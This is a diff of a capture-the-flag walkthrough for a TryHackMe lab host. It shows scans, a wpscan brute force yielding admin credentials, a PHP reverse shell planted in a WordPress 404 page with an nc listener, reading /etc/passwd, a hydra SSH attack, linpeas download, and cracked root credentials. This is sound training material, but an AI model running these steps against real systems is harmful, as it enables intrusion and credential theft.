@@ -4,148 +4,150 @@ These notes are from a challenge I did @[tryhackme](https://tryhackme.com) calle
 
 ## First Checks
 
-Let's add internal.thm to the hosts file as requested and run nmap, niktio and gobuster to scan the target.
+Let's add victim.thm to the hosts file as requested and run nmap, niktio and gobuster to scan the target.
 
 ``` sh
-sudo echo 10.10.156.30 internal.thm >> /etc/hosts
-
-IP="10.10.156.30"
-echo $IP
-nmap -sC -sV $IP
-nikto -h $IP
+sudo echo 10.10.156.30 victim.thm >> /etc/hosts
+echo victim.thm
+nmap -sC -sV victim.thm
+nikto -h victim.thm
 ```
 
-??? output "Nmap output"
-    ``` sh
-    nmap -sC -sV $IP
-    Nmap scan report for 10.10.156.30
-    Host is up (0.020s latency).
-    Not shown: 998 closed ports
-    PORT   STATE SERVICE VERSION
-    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-    | ssh-hostkey:
-    |   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
-    |   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
-    |_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
-    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-    |_http-server-header: Apache/2.4.29 (Ubuntu)
-    |_http-title: Apache2 Ubuntu Default Page: It works
-    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+nmap output
 
-    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-    Nmap done: 1 IP address (1 host up) scanned in 8.50 seconds
-    ```
+``` sh
+nmap -sC -sV $IP
+Nmap scan report for 10.10.156.30
+Host is up (0.020s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
+|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
+|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-??? output "nikto output"
-    ``` sh
-    nikto -h $IP
-    - Nikto v2.1.6
-    ---------------------------------------------------------------------------
-    + Target IP:          10.10.156.30
-    + Target Hostname:    10.10.156.30
-    + Target Port:        80
-    ---------------------------------------------------------------------------
-    + Server: Apache/2.4.29 (Ubuntu)
-    + The anti-clickjacking X-Frame-Options header is not present.
-    + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
-    + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
-    + No CGI Directories found (use '-C all' to force check all possible dirs)
-    + Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 5abef58e962a5, mtime: gzip
-    + Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
-    + Allowed HTTP Methods: OPTIONS, HEAD, GET, POST
-    + Uncommon header 'x-ob_mode' found, with contents: 1
-    + OSVDB-3233: /icons/README: Apache default file found.
-    + /phpmyadmin/: phpMyAdmin directory found
-    + Cookie wordpress_test_cookie created without the httponly flag
-    + /blog/wp-login.php: Wordpress login found
-    + 8042 requests: 0 error(s) and 11 item(s) reported on remote host
-    ---------------------------------------------------------------------------
-    + 1 host(s) tested
-    ```
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.50 seconds
+```
 
-??? output "gobuster output"
-    ``` txt
-    gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.156.30:80
-    ===============================================================
-    /blog                 (Status: 301) [Size: 311] [--> http://10.10.156.30/blog/]
-    /wordpress            (Status: 301) [Size: 316] [--> http://10.10.156.30/wordpress/]
-    /javascript           (Status: 301) [Size: 317] [--> http://10.10.156.30/javascript/]
-    /phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.156.30/phpmyadmin/]
-    /server-status        (Status: 403) [Size: 277]
-    ```
+nikto output
 
-??? output "Wordpress output"
-    ``` txt
-    wpscan --url http://10.10.156.30/wordpress -P rockyou.txt -U admin
-    _______________________________________________________________
-            __          _______   _____
-            \ \        / /  __ \ / ____|
-            \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
-            \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
-                \  /\  /  | |     ____) | (__| (_| | | | |
-                \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+``` sh
+nikto -h $IP
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.156.30
++ Target Hostname:    10.10.156.30
++ Target Port:        80
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 5abef58e962a5, mtime: gzip
++ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST
++ Uncommon header 'x-ob_mode' found, with contents: 1
++ OSVDB-3233: /icons/README: Apache default file found.
++ /phpmyadmin/: phpMyAdmin directory found
++ Cookie wordpress_test_cookie created without the httponly flag
++ /blog/wp-login.php: Wordpress login found
++ 8042 requests: 0 error(s) and 11 item(s) reported on remote host
+---------------------------------------------------------------------------
++ 1 host(s) tested
+```
 
-            WordPress Security Scanner by the WPScan Team
-                            Version 3.8.17
-        Sponsored by Automattic - https://automattic.com/
-        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
-    _______________________________________________________________
+output "gobuster output"
 
-    Interesting Finding(s):
+``` txt
+gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.156.30:80
+===============================================================
+/blog                 (Status: 301) [Size: 311] [--> http://10.10.156.30/blog/]
+/wordpress            (Status: 301) [Size: 316] [--> http://10.10.156.30/wordpress/]
+/javascript           (Status: 301) [Size: 317] [--> http://10.10.156.30/javascript/]
+/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.156.30/phpmyadmin/]
+/server-status        (Status: 403) [Size: 277]
+```
 
-    [+] Headers
-    | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
-    | Found By: Headers (Passive Detection)
-    | Confidence: 100%
+Wordpress output
 
-    [+] XML-RPC seems to be enabled: http://10.10.156.30/wordpress/xmlrpc.php
-    | Found By: Direct Access (Aggressive Detection)
-    | Confidence: 100%
-    | References:
-    |  - http://codex.wordpress.org/XML-RPC_Pingback_API
-    |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
-    |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
-    |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
-    |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+``` txt
+wpscan --url http://10.10.156.30/wordpress -P rockyou.txt -U admin
+_______________________________________________________________
+        __          _______   _____
+        \ \        / /  __ \ / ____|
+        \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+        \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
 
-    [+] WordPress readme found: http://10.10.156.30/wordpress/readme.html
-    | Found By: Direct Access (Aggressive Detection)
-    | Confidence: 100%
+        WordPress Security Scanner by the WPScan Team
+                        Version 3.8.17
+    Sponsored by Automattic - https://automattic.com/
+    @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
 
-    [+] The external WP-Cron seems to be enabled: http://10.10.156.30/wordpress/wp-cron.php
-    | Found By: Direct Access (Aggressive Detection)
-    | Confidence: 60%
-    | References:
-    |  - https://www.iplocation.net/defend-wordpress-from-ddos
-    |  - https://github.com/wpscanteam/wpscan/issues/1299
+Interesting Finding(s):
 
-    [+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
-    | Found By: Emoji Settings (Passive Detection)
-    |  - http://10.10.156.30/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2'
-    | Confirmed By: Meta Generator (Passive Detection)
-    |  - http://10.10.156.30/wordpress/, Match: 'WordPress 5.4.2'
+[+] Headers
+| Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
+| Found By: Headers (Passive Detection)
+| Confidence: 100%
 
-    [i] The main theme could not be detected.
+[+] XML-RPC seems to be enabled: http://10.10.156.30/wordpress/xmlrpc.php
+| Found By: Direct Access (Aggressive Detection)
+| Confidence: 100%
+| References:
+|  - http://codex.wordpress.org/XML-RPC_Pingback_API
+|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+|  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
 
-    [+] Enumerating All Plugins (via Passive Methods)
+[+] WordPress readme found: http://10.10.156.30/wordpress/readme.html
+| Found By: Direct Access (Aggressive Detection)
+| Confidence: 100%
 
-    [i] No plugins Found.
+[+] The external WP-Cron seems to be enabled: http://10.10.156.30/wordpress/wp-cron.php
+| Found By: Direct Access (Aggressive Detection)
+| Confidence: 60%
+| References:
+|  - https://www.iplocation.net/defend-wordpress-from-ddos
+|  - https://github.com/wpscanteam/wpscan/issues/1299
 
-    [+] Enumerating Config Backups (via Passive and Aggressive Methods)
-    Checking Config Backups - Time: 00:00:01 <============================================> (137 / 137) 100.00% Time: 00:00:01
+[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
+| Found By: Emoji Settings (Passive Detection)
+|  - http://10.10.156.30/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2'
+| Confirmed By: Meta Generator (Passive Detection)
+|  - http://10.10.156.30/wordpress/, Match: 'WordPress 5.4.2'
 
-    [i] No Config Backups Found.
+[i] The main theme could not be detected.
 
-    [+] Performing password attack on Xmlrpc against 1 user/s
-    [SUCCESS] - admin / my2boys
-    Trying admin / lizzy Time: 00:01:19 <                                             > (3885 / 14348276)  0.02%  ETA: ??:??:??
+[+] Enumerating All Plugins (via Passive Methods)
 
-    [!] Valid Combinations Found:
-    | Username: admin, Password: my2boys
+[i] No plugins Found.
 
-    [!] No WPScan API Token given, as a result vulnerability data has not been output.
-    [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
-    ```
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+Checking Config Backups - Time: 00:00:01 <============================================> (137 / 137) 100.00% Time: 00:00:01
+
+[i] No Config Backups Found.
+
+[+] Performing password attack on Xmlrpc against 1 user/s
+[SUCCESS] - admin / my2boys
+Trying admin / lizzy Time: 00:01:19 <                                             > (3885 / 14348276)  0.02%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+| Username: admin, Password: my2boys
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+```
 
 So now we can login to wordpress as admin and look around.
 
@@ -155,45 +157,46 @@ The wordpress page reveals a private note on credentals of william being william
 
 I used this [php reverse shell](https://github.com/ivan-sincek/php-reverse-shell), modified IP and port and uploaded it to the wordpress 404 page. Now time to start netcat on the chosen port e.g.```nc -lvnp 6666``` and call a page that doesn't exist e.g.```/blog/index.php/2020/08/03/50/``` with e.g. curl.
 
-We now get a reverse shell but no TTY so we can try this: ``` python -c 'import pty; pty.spawn("/bin/sh")'``` or this```/bin/sh -i```.
+We now get a reverse shell but no TTY so we can try this: ```python -c 'import pty; pty.spawn("/bin/sh")'``` or this```/bin/sh -i```.
 
 Let's have a look around:
 
-??? output "cat /etc/passwd output"
-    ``` sh
-    cat /etc/passwd
-    root:x:0:0:root:/root:/bin/bash
-    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-    bin:x:2:2:bin:/bin:/usr/sbin/nologin
-    sys:x:3:3:sys:/dev:/usr/sbin/nologin
-    sync:x:4:65534:sync:/bin:/bin/sync
-    games:x:5:60:games:/usr/games:/usr/sbin/nologin
-    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-    systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
-    systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
-    syslog:x:102:106::/home/syslog:/usr/sbin/nologin
-    messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
-    _apt:x:104:65534::/nonexistent:/usr/sbin/nologin
-    lxd:x:105:65534::/var/lib/lxd/:/bin/false
-    uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
-    dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
-    landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
-    pollinate:x:109:1::/var/cache/pollinate:/bin/false
-    sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
-    aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
-    mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
-    ```
+/etc/passwd output
+
+``` sh
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
+```
 
 The /home path shows one user "aubreanna" so let's use this to crack ssh using hydra:
 
@@ -216,7 +219,7 @@ aubreanna:bubb13guM!@#123
 
 ## Aubreanna
 
-So let's login via aubreanna: ```ssh aubreanna@10.10.156.30``` and we find the first flag (user.txt) in the home dir.
+So let's login via aubreanna: ```ssh aubreanna@victim.thm``` and we find the first flag (user.txt) in the home dir.
 
 Unfortunately```sudo -l``` is not allowed
 
@@ -234,7 +237,7 @@ From the Kali system
 
 ``` sh
 wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
-scp linpeas.sh aubreanna@10.10.156.30:~/linpeas.sh
+scp linpeas.sh aubreanna@victim.thm:~/linpeas.sh
 ```
 
 On the target machine as aubreanna:
@@ -279,13 +282,13 @@ I tried changing the c code but felt like a script kiddy as errors just moved on
 
 In the home folder of aubreanna there is txt mentioning a local jenkins server.
 
-From kali lets tunnel local port 31340 with ssh to "127.0.0.1:8080" on internal.thm (which we modified at the beginning).
+From kali lets tunnel local port 31340 with ssh to "127.0.0.1:8080" on victim.thm (which we modified at the beginning).
 
 ``` sh
-ssh -g -L31340:127.0.0.1:8080 -l aubreanna internal.thm
+ssh -g -L31340:127.0.0.1:8080 -l aubreanna victim.thm
 ```
 
-We can the open jenkins from your kali machine e.g. http://localhost:31340 and analyse the login prompt with burpsuite:
+We can the open jenkins from your kali machine e.g. <http://localhost:31340> and analyse the login prompt with burpsuite:
 
 ![_internal_burpsuite](_internal_burpsuite.jpg)
 
@@ -342,6 +345,6 @@ root:tr0ub13guM!@#123
 Let ssh as root and see if we find the flag :)
 
 ``` sh
-ssh root@10.10.156.30
+ssh root@victim.thm
 root@internal:~# cat root.txt
 ```
